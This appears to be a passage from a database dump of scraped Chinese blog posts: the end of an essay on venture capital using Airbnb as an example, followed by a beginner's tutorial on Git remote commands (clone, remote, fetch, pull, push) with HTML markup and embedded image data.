src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-21 06:13:53', '2014-06-26 07:01:20', 0, '[["Airbnb", 0.1867932422328125], ["\\u521b\\u6295", 0.17056135096812503], ["\\u54e5\\u8428\\u514b\\u4eba", 0.14528363284774307], ["\\u521b\\u4e1a\\u8005", 0.11095477637598959], ["\\u72b9\\u592a\\u4eba", 0.086598218683125], ["\\u4e00\\u4e2a", 0.06848214168371528], ["Paul", 0.06226441407760416], ["Wilson", 0.06226441407760416], ["Fred", 0.06226441407760416], ["do", 0.06226441407760416], ["Graham", 0.06226441407760416], ["\\u5582\\u9e21", 0.059457140636458336], ["\\u9879\\u76ee", 0.059339952682013884], ["\\u521b\\u59cb\\u4eba", 0.050833600796458336], ["\\u4ed6\\u4eec", 0.048754147582916664], ["\\u521b\\u4e1a", 0.04850662641208334], ["\\u4f18\\u79c0", 0.04710744547784722], ["\\u51fa\\u8eab", 0.04673464703791667], ["\\u70b9\\u5b50", 0.04558949570395834], ["\\u516c\\u5bd3", 0.044213706250625]]', NULL, NULL, '最近，网上有一篇文章《黑暗创投圈》引起了争论，新浪科技的杜丹编辑向我约稿，谈谈对它的看法。 那篇文章抨击了国内创投圈的乱象，感慨国内缺乏导师型的创投，多的是职业投资人出身的创投。这导致了一方面，投资人像评估银行贷款一样地评估创业项目；另一方面，创业者日益重视项目的包装和概念，而忽视"内功"。 一定程度上，我同意那篇文章的观点，确实感到国内很多创投，不善于孵化和培育项目，只是一个单纯的出资者的角色。更糟的是，往往投钱以后，创投就深度介入项目开发，主导产品方向，逼迫创业者采纳他们的观点，不顾自己其实对技术知之甚少。大多数时候，这种做法只会起到反作用。 这让我想起StackOverflow的创始人Joel Spolsky，在《软件随想录》中举过的一个例子。 19世纪的时候，在俄国的一个小村庄里，住着一个贫穷的犹太人。有一天，他遇到了一个骑着马的哥萨克人 。 "你用什么喂鸡？"哥萨克人问。 "就用一点面包屑。"犹太人回答。 "你好大的胆子，竟敢用这么低等的饲料喂俄国鸡！"哥萨克人说，拿起棍子打犹太人。 第二天，哥萨克人又来了。"现在，你用什么喂鸡？"他问犹太人。 "报告大人，我给它上三道大菜，分别是新割下的鲜草，上等的鲟鱼鱼子酱，还有一小碗鲜奶油，上面还洒着进口的法国松露巧克力作为甜食。" "白痴！"哥萨克人说，拿起棍子打犹太人，"你好大的胆子，竟敢在低等的家禽身上浪费这么好的食物！" 第三天，哥萨克人又来问："你用什么喂鸡？" "不喂了！"犹太人禀告，"我给它一个铜板，它想吃什么就自个儿去买。" 在我看来，很多国内创投就像上面故事里的哥萨克人，他们其实不知道怎么把事情做好，只是下命令，让创业者自己想办法解决问题。真正优秀的创投，应该起到一个指路人的作用，帮助创业团队把项目做对、做大、做好。 Airbnb就是一个很好的例子，它2009年出自美国最著名的创业孵化器YC。今年4月刚刚完成4.5亿美元的B轮投资，目前估值为100亿美元。可以说，它是历史上最成功的创业公司之一。 就是这样一家明星公司，曾经令美国两大创投产生过严重分歧。YC创始人Paul Graham坚决看好，而纽约风险投资家Fred Wilson则表示怀疑。我觉得，这是一个绝佳的例子，可以说明一个优秀的创投可以发挥多大的作用。 Fred Wilson之所以不看好Airbnb，是因为他是投资银行出身，使用传统眼光评价。在他看来，首先，Airbnb的两个创始人都是设计系毕业，缺乏软件背景；其次，他们在旧金山过得穷困潦倒，连房租都付不出；第三，只因为某次会议导致旅馆紧张，他们靠出租自己的公寓赚了一笔，居然就觉得可以创办一个类似Ebay的专门出租公寓的网站。这怎么可能成功呢？况且，就算有人将自己的公寓放上他们的网站，也可以放到其他网站啊！ Paul Graham是程序员出身，看问题的眼光，与投资家出身的创投完全不同。他最看中的不是令人叫好的项目或者创意，而是创业者的素质。因为一个优秀的创业者，可以将坏点子变成好点子，将好点子变成可以出售的产品。在他看来，Airbnb的两个创业者有着非凡的创造力和执行力，这远比Airbnb的创意本身重要。 一个例证是，2008年正赶上美国总统大选，Airbnb的创始人灵机一动，将奥巴马和麦凯恩的卡通形象，分别印在500个包装盒上，里面装入燕麦片，每一盒都有一个独一无二的编号，然后拿到民主党和共和党的全国代表大会出售，每盒售价40美元。最后居然赚了30000美元，这比当时Airbnb得到的天使投资都要多。这件事给Paul Graham留下深刻印象，从此认定Airbnb这个项目会成功。 后来，Fred Wilson公开承认，错过Airbnb是他风投生涯中最大的错误。他说道： "我太关注他们那时正在做的事情，而忽视了他们做过的、将做的、有能力做的事情。" （We focused too much on what they were doing at the time and not enough on what they could do, would do, and did do.） 这句话就是我心目中，优秀的创投应该具备的素质。他看出创业者的潜质，提供各种条件，鼓励和支持他们发挥自己的潜力，为项目出谋划策，帮助形成概念、评估架构、推广产品，将一颗种子扶植成小树苗，进而拥有了长成参天大树的无限可能。 （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年6月26日 更多内容： 档案 » 创业 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL),
(20, 'http://www.ruanyifeng.com/blog/2014/06/git_remote.html', 'Git远程操作详解', '<p><a href="http://zh.wikipedia.org/wiki/Git">Git</a>是目前最流行的<a href="http://www.ruanyifeng.com/blog/2008/12/a_visual_guide_to_version_control.html">版本管理系统</a>，学会Git几乎成了开发者的必备技能。</p>\n\n        <p>Git有很多优势，其中之一就是远程操作非常简便。本文详细介绍5个Git命令，它们的概念和用法，理解了这些内容，你就会完全掌握Git远程操作。</p>\n\n<ul>\n<li>git clone</li>\n<li>git remote</li>\n<li>git fetch</li>\n<li>git pull</li>\n<li>git push</li>\n</ul>\n\n<p>本文针对初级用户，从最简单的讲起，但是需要读者对Git的基本用法有所了解。同时，本文覆盖了上面5个命令的几乎所有的常用用法，所以对于熟练用户也有参考价值。</p>\n\n<p><img alt="git" src="http://image.beekka.com/blog/2014/bg2014061202.jpg" title="" /></p>\n\n<h2>一、git clone</h2>\n\n<p>远程操作的第一步，通常是从远程主机克隆一个版本库，这时就要用到git clone命令。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git clone <版本库的网址>\n</code></pre></blockquote>\n\n<p>比如，克隆jQuery的版本库。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git clone https://github.com/jquery/jquery.git\n</code></pre></blockquote>\n\n<p>该命令会在本地主机生成一个目录，与远程主机的版本库同名。如果要指定不同的目录名，可以将目录名作为git clone命令的第二个参数。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git clone <版本库的网址> <本地目录名>\n</code></pre></blockquote>\n\n<p>git clone支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git clone http[s]://example.com/path/to/repo.git/\n$ git clone ssh://example.com/path/to/repo.git/\n$ git clone git://example.com/path/to/repo.git/\n$ git clone /opt/git/project.git \n$ git clone file:///opt/git/project.git\n$ git clone ftp[s]://example.com/path/to/repo.git/\n$ git clone rsync://example.com/path/to/repo.git/\n</code></pre></blockquote>\n\n<p>SSH协议还有另一种写法。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git clone [user@]example.com:path/to/repo.git/\n</code></pre></blockquote>\n\n<p>通常来说，Git协议下载速度最快，SSH协议用于需要用户认证的场合。各种协议优劣的详细讨论请参考<a href="http://git-scm.com/book/en/Git-on-the-Server-The-Protocols">官方文档</a>。</p>\n\n<h2>二、git remote</h2>\n\n<p>为了便于管理，Git要求每个远程主机都必须指定一个主机名。git remote命令就用于管理主机名。</p>\n\n<p>不带选项的时候，git remote命令列出所有远程主机。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git remote\norigin\n</code></pre></blockquote>\n\n<p>使用-v选项，可以参看远程主机的网址。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git remote -v\norigin  git@github.com:jquery/jquery.git (fetch)\norigin  git@github.com:jquery/jquery.git (push)\n</code></pre></blockquote>\n\n<p>上面命令表示，当前只有一台远程主机，叫做origin，以及它的网址。</p>\n\n<p>克隆版本库的时候，所使用的远程主机自动被Git命名为origin。如果想用其他的主机名，需要用git clone命令的-o选项指定。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git clone -o jQuery https://github.com/jquery/jquery.git\n$ git remote\njQuery\n</code></pre></blockquote>\n\n<p>上面命令表示，克隆的时候，指定远程主机叫做jQuery。</p>\n\n<p>git remote show命令加上主机名，可以查看该主机的详细信息。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git remote show <主机名>\n</code></pre></blockquote>\n\n<p>git remote add命令用于添加远程主机。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git remote add <主机名> <网址>\n</code></pre></blockquote>\n\n<p>git remote rm命令用于删除远程主机。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git remote rm <主机名>\n</code></pre></blockquote>\n\n<p>git remote rename命令用于远程主机的改名。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git remote rename <原主机名> <新主机名>\n</code></pre></blockquote>\n\n<h2>三、git fetch</h2>\n\n<p>一旦远程主机的版本库有了更新（Git术语叫做commit），需要将这些更新取回本地，这时就要用到git fetch命令。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git fetch <远程主机名>\n</code></pre></blockquote>\n\n<p>上面命令将某个远程主机的更新，全部取回本地。</p>\n\n<p>默认情况下，git fetch取回所有分支（branch）的更新。如果只想取回特定分支的更新，可以指定分支名。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git fetch <远程主机名> <分支名>\n</code></pre></blockquote>\n\n<p>比如，取回origin主机的master分支。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git fetch origin master\n</code></pre></blockquote>\n\n<p>所取回的更新，在本地主机上要用"远程主机名/分支名"的形式读取。比如origin主机的master，就要用origin/master读取。</p>\n\n<p>git branch命令的-r选项，可以用来查看远程分支，-a选项查看所有分支。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git branch -r\norigin/master\n\n$ git branch -a\n* master\n  remotes/origin/master\n</code></pre></blockquote>\n\n<p>上面命令表示，本地主机的当前分支是master，远程分支是origin/master。</p>\n\n<p>取回远程主机的更新以后，可以在它的基础上，使用git checkout命令创建一个新的分支。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git checkout -b newBrach origin/master\n</code></pre></blockquote>\n\n<p>上面命令表示，在origin/master的基础上，创建一个新分支。</p>\n\n<p>此外，也可以使用git merge命令或者git rebase命令，在本地分支上合并远程分支。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git merge origin/master\n# 或者\n$ git rebase origin/master\n</code></pre></blockquote>\n\n<p>上面命令表示在当前分支上，合并origin/master。</p>\n\n<h2>四、git pull</h2>\n\n<p>git pull命令的作用是，取回远程主机某个分支的更新，再与本地的指定分支合并。它的完整格式稍稍有点复杂。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git pull <远程主机名> <远程分支名>:<本地分支名>\n</code></pre></blockquote>\n\n<p>比如，取回origin主机的next分支，与本地的master分支合并，需要写成下面这样。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git pull origin next:master\n</code></pre></blockquote>\n\n<p>如果远程分支是与当前分支合并，则冒号后面的部分可以省略。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git pull origin next\n</code></pre></blockquote>\n\n<p>上面命令表示，取回origin/next分支，再与当前分支合并。实质上，这等同于先做git fetch，再做git merge。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git fetch origin\n$ git merge origin/next\n</code></pre></blockquote>\n\n<p>在某些场合，Git会自动在本地分支与远程分支之间，建立一种追踪关系（tracking）。比如，在git clone的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，也就是说，本地的master分支自动"追踪"origin/master分支。</p>\n\n<p>Git也允许手动建立追踪关系。</p>\n\n<blockquote><pre><code class="language-javascript">\ngit branch --set-upstream master origin/next\n</code></pre></blockquote>\n\n<p>上面命令指定master分支追踪origin/next分支。</p>\n\n<p>如果当前分支与远程分支存在追踪关系，git pull就可以省略远程分支名。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git pull origin\n</code></pre></blockquote>\n\n<p>上面命令表示，本地的当前分支自动与对应的origin主机"追踪分支"（remote-tracking branch）进行合并。</p>\n\n<p>如果当前分支只有一个追踪分支，连远程主机名都可以省略。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git pull\n</code></pre></blockquote>\n\n<p>上面命令表示，当前分支自动与唯一一个追踪分支进行合并。</p>\n\n<p>如果合并需要采用rebase模式，可以使用--rebase选项。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git pull --rebase <远程主机名> <远程分支名>:<本地分支名>\n</code></pre></blockquote>\n\n<h2>五、git push</h2>\n\n<p>git push命令用于将本地分支的更新，推送到远程主机。它的格式与git pull命令相仿。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push <远程主机名> <本地分支名>:<远程分支名>\n</code></pre></blockquote>\n\n<p>注意，分支推送顺序的写法是&lt;来源地>:&lt;目的地>，所以git pull是&lt;远程分支>:&lt;本地分支>，而git push是&lt;本地分支>:&lt;远程分支>。</p>\n\n<p>如果省略远程分支名，则表示将本地分支推送与之存在"追踪关系"的远程分支（通常两者同名），如果该远程分支不存在，则会被新建。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push origin master\n</code></pre></blockquote>\n\n<p>上面命令表示，将本地的master分支推送到origin主机的master分支。如果后者不存在，则会被新建。</p>\n\n<p>如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push origin :master\n# 等同于\n$ git push origin --delete master\n</code></pre></blockquote>\n\n<p>上面命令表示删除origin主机的master分支。</p>\n\n<p>如果当前分支与远程分支之间存在追踪关系，则本地分支和远程分支都可以省略。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push origin\n</code></pre></blockquote>\n\n<p>上面命令表示，将当前分支推送到origin主机的对应分支。</p>\n\n<p>如果当前分支只有一个追踪分支，那么主机名都可以省略。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push\n</code></pre></blockquote>\n\n<p>如果当前分支与多个主机存在追踪关系，则可以使用-u选项指定一个默认主机，这样后面就可以不加任何参数使用git push。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push -u origin master\n</code></pre></blockquote>\n\n<p>上面命令将本地的master分支推送到origin主机，同时指定origin为默认主机，后面就可以不加任何参数使用git push了。</p>\n\n<p>不带任何参数的git push，默认只推送当前分支，这叫做simple方式。此外，还有一种matching方式，会推送所有有对应的远程分支的本地分支。Git 2.0版本之前，默认采用matching方法，现在改为默认采用simple方式。如果要修改这个设置，可以采用git config命令。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git config --global push.default matching\n# 或者\n$ git config --global push.default simple\n</code></pre></blockquote>\n\n<p>还有一种情况，就是不管是否存在对应的远程分支，将本地的所有分支都推送到远程主机，这时需要使用--all选项。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push --all origin\n</code></pre></blockquote>\n\n<p>上面命令表示，将所有本地分支都推送到origin主机。</p>\n\n<p>如果远程主机的版本比本地版本更新，推送时Git会报错，要求先在本地做git pull合并差异，然后再推送到远程主机。这时，如果你一定要推送，可以使用--force选项。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push --force origin \n</code></pre></blockquote>\n\n<p>上面命令使用--force选项，结果导致远程主机上更新的版本被覆盖。除非你很确定要这样做，否则应该尽量避免使用--force选项。</p>\n\n<p>最后，git push不会推送标签（tag），除非使用--tags选项。</p>\n\n<blockquote><pre><code class="language-javascript">\n$ git push origin --tags\n</code></pre></blockquote>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-06-12T13:22:22+08:00">2014年6月12日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/developer/"> <img 